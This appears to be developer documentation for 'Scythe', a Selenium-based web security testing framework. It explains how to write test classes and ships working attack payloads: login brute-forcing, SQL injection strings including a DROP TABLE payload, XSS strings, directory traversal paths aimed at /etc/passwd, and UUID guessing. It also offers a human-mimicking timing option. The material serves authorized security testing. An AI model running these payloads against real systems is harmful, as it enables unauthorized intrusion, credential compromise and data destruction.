# Scythe TTPs (Tactics, Techniques, and Procedures) Framework

The Scythe TTP framework provides a flexible and extensible way to create and execute security tests that emulate real-world attacker behaviors. This document covers everything you need to know about creating, using, and extending TTPs.

## Overview

A TTP (Tactic, Technique, and Procedure) in Scythe represents a specific attack pattern or security test. Each TTP is a self-contained unit that:

- Generates payloads for testing
- Executes test actions against a target
- Verifies whether the test succeeded or failed
- Provides structured results for analysis

TTPs are designed to be:
- **Modular**: Each TTP focuses on a specific attack technique
- **Reusable**: TTPs can be configured for different targets and scenarios
- **Extensible**: New TTPs can be easily created by extending the base class
- **Realistic**: TTPs emulate actual attacker behaviors

## Core TTP Structure

### Base TTP Class

All TTPs inherit from the abstract `TTP` base class:

```python
from abc import ABC, abstractmethod
from typing import Generator, Any
from selenium.webdriver.remote.webdriver import WebDriver

class TTP(ABC):
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description

    @abstractmethod
    def get_payloads(self) -> Generator[Any, None, None]:
        """Yields payloads for the test execution."""
        pass

    @abstractmethod
    def execute_step(self, driver: WebDriver, payload: Any) -> None:
        """Executes a single test action using the provided payload."""
        pass

    @abstractmethod
    def verify_result(self, driver: WebDriver) -> bool:
        """Verifies the outcome of the executed step."""
        pass
```

### Required Methods

#### `get_payloads()`
- **Purpose**: Generates payloads for the TTP to test
- **Returns**: Generator that yields payloads one at a time
- **Example**: Password lists, SQL injection strings, XSS payloads

#### `execute_step(driver, payload)`
- **Purpose**: Performs the actual test action using the current payload
- **Parameters**: 
  - `driver`: Selenium WebDriver instance
  - `payload`: Current payload to test
- **Actions**: Fill forms, click buttons, navigate URLs, etc.

#### `verify_result(driver)`
- **Purpose**: Determines if the test step succeeded or failed
- **Returns**: `True` if successful/vulnerable, `False` otherwise
- **Examples**: Check for error messages, URL changes, page content

## Built-in TTPs

### LoginBruteforceTTP

Tests login forms by attempting multiple password combinations.

```python
from scythe.ttps.web.login_bruteforce import LoginBruteforceTTP
from scythe.payloads.generators import WordlistPayloadGenerator

# Create payload generator
payload_generator = WordlistPayloadGenerator("passwords.txt")

# Create TTP instance
login_ttp = LoginBruteforceTTP(
    payload_generator=payload_generator,
    username="admin",
    username_selector="#username",
    password_selector="#password",
    submit_selector="#submit"
)
```

**Parameters:**
- `payload_generator`: Generator for password payloads
- `username`: Target username to test
- `username_selector`: CSS selector for username field
- `password_selector`: CSS selector for password field
- `submit_selector`: CSS selector for submit button

**Success Criteria:**
- URL no longer contains "login" (indicating successful login)

**Use Cases:**
- Testing weak authentication mechanisms
- Validating password policies
- Testing account lockout mechanisms
- Brute force attack simulation

### SQL Injection TTPs

#### InputFieldInjector

Tests SQL injection through form input fields.

```python
from scythe.ttps.web.sql_injection import InputFieldInjector
from scythe.payloads.generators import StaticPayloadGenerator

# Create SQL injection payloads
sql_payloads = StaticPayloadGenerator([
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE users; --"
])

# Create TTP instance
sql_ttp = InputFieldInjector(
    target_url="http://example.com/search",
    field_selector="input[name='search']",
    submit_selector="button[type='submit']",
    payload_generator=sql_payloads
)
```

**Parameters:**
- `target_url`: Target URL for the test
- `field_selector`: CSS selector for input field
- `submit_selector`: CSS selector for submit button
- `payload_generator`: Generator for SQL injection payloads

#### URLManipulation

Tests SQL injection through URL parameter manipulation.

```python
from scythe.ttps.web.sql_injection import URLManipulation

# Create URL manipulation TTP
url_sql_ttp = URLManipulation(
    payload_generator=sql_payloads,
    target_url="http://example.com/page"
)
```

**Parameters:**
- `payload_generator`: Generator for SQL injection payloads
- `target_url`: Base URL to append payloads to

**Success Criteria:**
- Page source contains "sql" or "source" (indicating database errors)

**Use Cases:**
- Testing URL parameter sanitization
- Database error disclosure testing
- Blind SQL injection detection
- Input validation bypass testing

### UUID Guessing TTP

Tests for predictable or guessable UUIDs in URL paths.

```python
from scythe.ttps.web.uuid_guessing import GuessUUIDInURL
from scythe.payloads.generators import StaticPayloadGenerator
from uuid import uuid4

# Generate UUID payloads
uuid_payloads = StaticPayloadGenerator([
    uuid4() for _ in range(1000)
])

# Create UUID guessing TTP
uuid_ttp = GuessUUIDInURL(
    target_url="http://example.com",
    uri_root_path="/api/users/",
    payload_generator=uuid_payloads
)
```

**Parameters:**
- `target_url`: Base URL
- `uri_root_path`: Path prefix where UUIDs are tested
- `payload_generator`: Generator for UUID payloads

**Success Criteria:**
- HTTP response is not 404, 401, or 403

**Use Cases:**
- Testing UUID randomness
- Access control bypass testing
- Information disclosure testing
- API security assessment

## Creating Custom TTPs

### Basic Custom TTP

```python
from scythe.core.ttp import TTP
from scythe.payloads.generators import StaticPayloadGenerator
from selenium.webdriver.common.by import By
from selenium.webdriver.remote.webdriver import WebDriver

class XSSReflectedTTP(TTP):
    def __init__(self, target_url: str, input_selector: str, submit_selector: str):
        super().__init__(
            name="Reflected XSS",
            description="Tests for reflected cross-site scripting vulnerabilities"
        )
        self.target_url = target_url
        self.input_selector = input_selector
        self.submit_selector = submit_selector
        self.payload_generator = StaticPayloadGenerator([
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ])

    def get_payloads(self):
        yield from self.payload_generator()

    def execute_step(self, driver: WebDriver, payload: str):
        driver.get(self.target_url)
        
        # Find and fill input field
        input_field = driver.find_element(By.CSS_SELECTOR, self.input_selector)
        input_field.clear()
        input_field.send_keys(payload)
        
        # Submit form
        submit_button = driver.find_element(By.CSS_SELECTOR, self.submit_selector)
        submit_button.click()

    def verify_result(self, driver: WebDriver) -> bool:
        # Check if payload is reflected in page source
        page_source = driver.page_source
        return any(payload in page_source for payload in [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ])
```

### Advanced Custom TTP

```python
from scythe.core.ttp import TTP
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time

class AdvancedDirectoryTraversalTTP(TTP):
    def __init__(self, target_url: str, file_param: str = "file"):
        super().__init__(
            name="Directory Traversal",
            description="Advanced directory traversal testing with multiple techniques"
        )
        self.target_url = target_url
        self.file_param = file_param
        self.payloads = self._generate_payloads()
        self.successful_payloads = []

    def _generate_payloads(self):
        """Generate comprehensive directory traversal payloads"""
        base_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd"
        ]
        
        # Add URL encoding variations
        encoded_payloads = []
        for payload in base_payloads:
            encoded_payloads.append(payload.replace("../", "%2E%2E%2F"))
            encoded_payloads.append(payload.replace("..\\", "%2E%2E%5C"))
        
        return base_payloads + encoded_payloads

    def get_payloads(self):
        yield from self.payloads

    def execute_step(self, driver: WebDriver, payload: str):
        try:
            # Construct URL with payload
            test_url = f"{self.target_url}?{self.file_param}={payload}"
            driver.get(test_url)
            
            # Wait for page to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
        except TimeoutException:
            # Page didn't load properly
            raise Exception("Page load timeout")

    def verify_result(self, driver: WebDriver) -> bool:
        page_source = driver.page_source.lower()
        
        # Check for common file contents that indicate success
        linux_indicators = [
            "root:x:0:0:",
            "/bin/bash",
            "/sbin/nologin",
            "daemon:x:"
        ]
        
        windows_indicators = [
            "# copyright (c) 1993-2009 microsoft corp.",
            "127.0.0.1       localhost",
            "::1             localhost"
        ]
        
        # Check for file content indicators
        for indicator in linux_indicators + windows_indicators:
            if indicator.lower() in page_source:
                return True
        
        # Check for error messages that might indicate partial success
        error_indicators = [
            "failed to open stream",
            "no such file or directory",
            "access denied",
            "permission denied"
        ]
        
        # These are not successes but indicate the parameter is being processed
        for indicator in error_indicators:
            if indicator in page_source:
                # Log this for manual review but don't count as success
                print(f"Potential parameter processing detected: {indicator}")
        
        return False

    def post_execution_analysis(self, results: list):
        """Custom analysis after execution completes"""
        if results:
            print(f"Directory traversal vulnerabilities found:")
            for result in results:
                print(f"  - {result['payload']}")
        else:
            print("No directory traversal vulnerabilities detected")
```

## TTP Best Practices

### 1. Payload Design

**Comprehensive Coverage:**
```python
# Good: Multiple payload types
payloads = [
    "' OR '1'='1",           # Basic SQL injection
    "' OR '1'='1' --",       # With comment
    "' UNION SELECT NULL--", # Union-based
    "'; WAITFOR DELAY '00:00:05'--"  # Time-based
]

# Better: Include edge cases and encoding
payloads = [
    "' OR '1'='1",
    "%27%20OR%20%271%27%3D%271",  # URL encoded
    "' OR '1'='1' /*",            # MySQL comment
    "' OR '1'='1' --",            # SQL comment
    "' OR (SELECT COUNT(*) FROM users) > 0--"  # Subquery
]
```

**Progressive Complexity:**
```python
def get_payloads(self):
    # Start with simple payloads
    yield from ["admin", "password", "123456"]
    
    # Progress to more complex ones
    yield from ["admin123", "password123", "qwerty"]
    
    # End with sophisticated payloads
    yield from ["P@ssw0rd", "Admin123!", "complex_pass_2023"]
```

### 2. Robust Error Handling

```python
def execute_step(self, driver: WebDriver, payload: str):
    try:
        element = driver.find_element(By.CSS_SELECTOR, self.selector)
        element.clear()
        element.send_keys(payload)
        
        # Handle different submit methods
        try:
            submit_btn = driver.find_element(By.CSS_SELECTOR, self.submit_selector)
            submit_btn.click()
        except NoSuchElementException:
            # Fallback to Enter key
            element.send_keys("\n")
            
    except NoSuchElementException as e:
        raise Exception(f"Element not found: {self.selector}. Error: {e}")
    except TimeoutException as e:
        raise Exception(f"Timeout waiting for element: {e}")
    except Exception as e:
        raise Exception(f"Unexpected error during execution: {e}")
```

### 3. Accurate Result Verification

```python
def verify_result(self, driver: WebDriver) -> bool:
    # Multiple verification methods
    current_url = driver.current_url
    page_source = driver.page_source.lower()
    
    # Check URL changes
    if "dashboard" in current_url or "welcome" in current_url:
        return True
    
    # Check for success indicators
    success_indicators = ["welcome", "dashboard", "profile", "logout"]
    if any(indicator in page_source for indicator in success_indicators):
        return True
    
    # Check for absence of error indicators
    error_indicators = ["invalid", "incorrect", "failed", "error"]
    if not any(indicator in page_source for indicator in error_indicators):
        # Additional checks needed - don't assume success
        return self._additional_verification(driver)
    
    return False

def _additional_verification(self, driver: WebDriver) -> bool:
    # Custom verification logic
    try:
        # Look for specific success elements
        success_element = driver.find_element(By.CLASS_NAME, "success-message")
        return success_element.is_displayed()
    except NoSuchElementException:
        return False
```

### 4. Performance Optimization

```python
class OptimizedTTP(TTP):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload_cache = {}
        self.element_cache = {}
    
    def execute_step(self, driver: WebDriver, payload: str):
        # Cache frequently used elements
        if 'username_field' not in self.element_cache:
            self.element_cache['username_field'] = driver.find_element(
                By.CSS_SELECTOR, self.username_selector
            )
        
        username_field = self.element_cache['username_field']
        
        # Efficient payload handling
        if payload not in self.payload_cache:
            # Process payload once
            self.payload_cache[payload] = self._process_payload(payload)
        
        processed_payload = self.payload_cache[payload]
        username_field.send_keys(processed_payload)
```

## Integration with Behaviors

TTPs work seamlessly with the behavior system:

```python
from scythe.core.executor import TTPExecutor
from scythe.behaviors import HumanBehavior

# Create TTP
my_ttp = CustomTTP(...)

# Create behavior
human_behavior = HumanBehavior(
    base_delay=2.0,
    delay_variance=1.0,
    mouse_movement=True
)

# Execute with behavior
executor = TTPExecutor(
    ttp=my_ttp,
    target_url="http://example.com",
    behavior=human_behavior
)

executor.run()
```

## Advanced TTP Features

### 1. State Management

```python
class StatefulTTP(TTP):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.state = {
            'session_id': None,
            'csrf_token': None,
            'cookies': {},
            'attempt_count': 0
        }
    
    def execute_step(self, driver: WebDriver, payload: str):
        # Update state
        self.state['attempt_count'] += 1
        
        # Use state information
        if self.state['csrf_token']:
            csrf_field = driver.find_element(By.NAME, 'csrf_token')
            csrf_field.clear()
            csrf_field.send_keys(self.state['csrf_token'])
        
        # Continue with normal execution
        # ...
    
    def verify_result(self, driver: WebDriver) -> bool:
        # Update state based on results
        if self._is_success(driver):
            self.state['session_id'] = self._extract_session_id(driver)
            return True
        return False
```

### 2. Multi-Step TTPs

```python
class MultiStepTTP(TTP):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.current_step = 0
        self.steps = [
            self._step_1_login,
            self._step_2_navigate,
            self._step_3_exploit
        ]
    
    def execute_step(self, driver: WebDriver, payload: str):
        if self.current_step < len(self.steps):
            self.steps[self.current_step](driver, payload)
            self.current_step += 1
        else:
            # Reset for next payload
            self.current_step = 0
            self.steps[0](driver, payload)
    
    def _step_1_login(self, driver: WebDriver, payload: str):
        # Login step
        pass
    
    def _step_2_navigate(self, driver: WebDriver, payload: str):
        # Navigation step
        pass
    
    def _step_3_exploit(self, driver: WebDriver, payload: str):
        # Exploitation step
        pass
```

### 3. Dynamic Payload Generation

```python
class DynamicPayloadTTP(TTP):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.discovered_params = []
    
    def get_payloads(self):
        # Initial static payloads
        yield from ["admin", "test", "user"]
        
        # Dynamic payloads based on discovery
        for param in self.discovered_params:
            yield f"{param}_admin"
            yield f"{param}_test"
    
    def execute_step(self, driver: WebDriver, payload: str):
        # Normal execution
        # ...
        
        # Discovery during execution
        self._discover_parameters(driver)
    
    def _discover_parameters(self, driver: WebDriver):
        # Find hidden fields, extract from JavaScript, etc.
        hidden_fields = driver.find_elements(By.CSS_SELECTOR, "input[type='hidden']")
        for field in hidden_fields:
            param_name = field.get_attribute('name')
            if param_name not in self.discovered_params:
                self.discovered_params.append(param_name)
```

## Testing and Validation

### Unit Testing TTPs

```python
import unittest
from unittest.mock import Mock, MagicMock
from your_ttp import CustomTTP

class TestCustomTTP(unittest.TestCase):
    def setUp(self):
        self.ttp = CustomTTP(
            target_url="http://test.com",
            username="testuser"
        )
        self.mock_driver = Mock()
    
    def test_payload_generation(self):
        payloads = list(self.ttp.get_payloads())
        self.assertGreater(len(payloads), 0)
        self.assertIn("admin", payloads)
    
    def test_execute_step(self):
        # Mock WebDriver behavior
        mock_element = Mock()
        self.mock_driver.find_element.return_value = mock_element
        
        # Test execution
        self.ttp.execute_step(self.mock_driver, "test_payload")
        
        # Verify interactions
        self.mock_driver.find_element.assert_called()
        mock_element.send_keys.assert_called_with("test_payload")
    
    def test_verify_result_success(self):
        self.mock_driver.current_url = "http://test.com/dashboard"
        result = self.ttp.verify_result(self.mock_driver)
        self.assertTrue(result)
    
    def test_verify_result_failure(self):
        self.mock_driver.current_url = "http://test.com/login"
        self.mock_driver.page_source = "Invalid credentials"
        result = self.ttp.verify_result(self.mock_driver)
        self.assertFalse(result)
```

### Integration Testing

```python
def test_ttp_integration():
    from scythe.core.executor import TTPExecutor
    from selenium import webdriver
    
    # Use test target
    ttp = CustomTTP(target_url="http://testphp.vulnweb.com")
    executor = TTPExecutor(ttp=ttp, target_url="http://testphp.vulnweb.com")
    
    # Run test
    executor.run()
    
    # Verify results
    assert len(executor.results) >= 0  # Should complete without crashing
```

## Common Patterns and Examples

### 1. File Upload TTPs

```python
class FileUploadTTP(TTP):
    def __init__(self, upload_selector: str, file_paths: list):
        super().__init__(
            name="File Upload",
            description="Tests file upload functionality"
        )
        self.upload_selector = upload_selector
        self.file_paths = file_paths
    
    def get_payloads(self):
        yield from self.file_paths
    
    def execute_step(self, driver: WebDriver, payload: str):
        file_input = driver.find_element(By.CSS_SELECTOR, self.upload_selector)
        file_input.send_keys(payload)
        
        # Submit form
        submit_btn = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
        submit_btn.click()
    
    def verify_result(self, driver: WebDriver) -> bool:
        # Check for upload success or security bypass
        return "uploaded successfully" in driver.page_source.lower()
```

### 2. API Testing TTPs

```python
import requests
from selenium.webdriver.remote.webdriver import WebDriver

class APIEndpointTTP(TTP):
    def __init__(self, api_base_url: str, endpoints: list):
        super().__init__(
            name="API Endpoint Discovery",
            description="Tests API endpoints for access controls"
        )
        self.api_base_url = api_base_url
        self.endpoints = endpoints
    
    def get_payloads(self):
        yield from self.endpoints
    
    def execute_step(self, driver: WebDriver, payload: str):
        # Navigate to a page that makes API calls
        driver.get(f"{self.api_base_url}/admin")
        
        # Extract session tokens if needed
        cookies = driver.get_cookies()
        session_data = {cookie['name']: cookie['value'] for cookie in cookies}
        
        # Make API request
        response = requests.get(
            f"{self.api_base_url}/api/{payload}",
            cookies=session_data
        )
        
        # Store response for verification
        self.last_response = response
    
    def verify_result(self, driver: WebDriver) -> bool:
        return hasattr(self, 'last_response') and \
               self.last_response.status_code == 200
```

## Troubleshooting

### Common Issues

1. **Element Not Found**: Use explicit waits and verify selectors
2. **Timing Issues**: Implement proper delays and wait conditions
3. **Stale Element References**: Re-find elements after page changes
4. **JavaScript Execution**: Use `driver.execute_script()` for dynamic content

### Debug Mode

```python
class DebugTTP(TTP):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.debug = True
    
    def execute_step(self, driver: WebDriver, payload: str):
        if self.debug:
            print(f"Executing with payload: {payload}")
            print(f"Current URL: {driver.current_url}")
        
        # Take screenshot for debugging
        driver.save_screenshot(f"debug_step_{payload}.png")
        
        # Normal execution
        # ...
```

## Performance Considerations

- Use element caching for repeated operations
- Implement payload preprocessing
- Consider batch operations where possible
- Monitor memory usage for large payload sets
- Use appropriate delays to avoid overwhelming targets

## Security Considerations

- Always get proper authorization before testing
- Use test environments when possible
- Implement rate limiting to avoid DoS
- Clean up test data after execution
- Be mindful of logging sensitive information

## Contributing New TTPs

1. Follow the established patterns and conventions
2. Include comprehensive docstrings and comments
3. Add unit tests for your TTP
4. Update documentation
5. Consider edge cases and error handling
6. Test with different target applications

For more examples and advanced usage, see the `examples/` directory and existing TTP implementations in `scythe/ttps/`.